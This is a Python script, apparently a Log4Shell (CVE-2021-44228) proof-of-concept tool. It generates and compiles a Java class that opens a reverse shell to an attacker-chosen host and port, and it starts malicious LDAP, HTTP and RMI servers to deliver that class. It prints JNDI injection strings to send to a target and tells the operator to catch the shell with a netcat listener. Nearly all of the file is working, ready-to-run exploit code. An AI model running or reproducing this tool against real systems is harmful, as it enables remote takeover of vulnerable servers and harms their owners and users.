#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload_ldap(userip: str, lport: int, ljava:str) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (userip, lport)

    p = Path("Exploit.java")
    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, ljava+"/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')


def generate_payload_rmi(userip:str, lport:int,rmiport:int, ljava:str)-> None:

    with open(os.path.join(CUR_FOLDER,"tools","EvilRMIServerNewTemplate.java")) as f:
        payload = f.read()
        payload=payload.replace("USERIP",userip)
        payload=payload.replace("USERPORT",str(lport))
        payload=payload.replace("RMIPORT",str(rmiport))
        p = Path("EvilRMIServerNew.java")

        try:
            p.write_text(payload)
            subprocess.run( [os.path.join(CUR_FOLDER,ljava+"/javac"), "-cp", os.path.join(CUR_FOLDER,"tools/catalina.jar") , str(p)],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
            print(Fore.YELLOW+"[=>] Now run your netcat and enjoy the shell : nc -lvp "+str(lport))
            subprocess.run( [os.path.join(CUR_FOLDER,ljava+"/java"),"-cp",os.path.join(CUR_FOLDER,"tools/catalina.jar:."),"EvilRMIServerNew"])

        except OSError as e:
            print(Fore.RED + f'[-] SomethingRMI went wrong {e}')
            raise e
        else:
            print(Fore.GREEN + '[+] Exploit javaRMI class created success')


def payload_ldap(userip: str, webport: int, lport: int, ljava:str, gen:str) -> None:

    generate_payload_ldap(userip, lport,ljava)
    if(gen==None):
    	sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    	print(Fore.GREEN + f"[+] Send me: {sendme}\n")
    elif(gen=='all' or gen=='ldap'):
        payloadsPath=os.path.join(CUR_FOLDER,"tools/payloads/ldap.txt")
        with open(payloadsPath) as f:
            for line in f:
                payload=line.strip()
                payload=payload.replace('%HOST%',userip+':'+str(1389)).replace('%PP%','a')
                print(payload)

    print(Fore.BLUE + '[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport,ljava))
    t1.start()
    # start the web server
    print(Fore.GREEN+"[+] Starting Webserver on port "+str(webport)+" http://0.0.0.0:"+str(webport))
    print(Fore.YELLOW+"[=>] Now run your netcat and enjoy the shell : nc -lvp "+str(lport))
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def payload_rmi(userip:str, rmiport:int, lport:int, ljava:str,gen:str)-> None:
    if(gen==None):
    	sendme = "${jndi:rmi://%s:%s/Object}" % (userip,rmiport)
    	print(Fore.GREEN + f"[+] Send me: {sendme}\n")
    elif(gen=='all' or gen=='rmi'):
        payloadsPath=os.path.join(CUR_FOLDER,"tools/payloads/rmi.txt")
        with open(payloadsPath) as f:
            for line in f:
                payload=line.strip()
                payload=payload.replace('%HOST%',userip+':'+str(rmiport)).replace('%PP%','Object')
                print(payload)
    generate_payload_rmi(userip, lport,rmiport,ljava)


def check_java(javalocation: str) -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, javalocation+"/java"),#+'/bin/java'
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0

def ldap_server(userip: str, lport: int, ljava:str) -> None:

    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, ljava+"/java"),#+"/bin/java"
        "-cp",
        os.path.join(CUR_FOLDER, "tools/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])

def main() -> None:
    init(autoreset=True)
    parser = argparse.ArgumentParser(description='log4shell PoC')
    parser.add_argument('--userip',
                        dest='userip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--webport',
                        dest='webport',
                        type=int,
                        default=8000,
                        help='listener port for HTTP port')
    parser.add_argument('--rmiport',
                        dest='rmiport',
                        type=int,
                        default=1097,
                        help='listener port for RMI server')
    parser.add_argument('--lport',
                        dest='lport',
                        type=int,
                        default=9001,
                        help='Netcat Port')
    parser.add_argument('--ljava',
                        dest='ljava',
                        type=str,
                        default='tools/jdk1.8.0_202/bin/',
                        help='Local Java Binaries Location')
    parser.add_argument('--gen',
    					dest='gen',
    					type=str,
    					help="Generate multiple payloads")
    parser.add_argument('--method',
                        dest='method',
                        type=str,
                        help='LDAP or RMI or all')
    parser.add_argument('--references',
                        dest='references',
                        action=argparse.BooleanOptionalAction,
                        help='Print references')
    args = parser.parse_args()

    try:
        if args.references:
            print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Based on https://github.com/kozmer/log4j-shell-poc
[!] And https://www.veracode.com/blog/research/exploiting-jndi-injections-java
[!] And https://github.com/cyberxml/log4j-poc
[!] But with poetry and simple to run :) by @shoxxdj
""")
        if not args.method:
            print(Fore.RED+'[-] Method argument is needed')
            raise SystemExit(1)
        if not check_java(args.ljava):
            print(Fore.RED + '[-] Java is not installed inside the repository')
            raise SystemExit(1)
        if(args.method=='ldap' or args.method=='all'):
            payload_ldap(args.userip, args.webport, args.lport, args.ljava,args.gen)
        if(args.method=='rmi' or args.method=='all'):
            payload_rmi( args.userip, args.rmiport, args.lport, args.ljava,args.gen)

    except KeyboardInterrupt:
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)
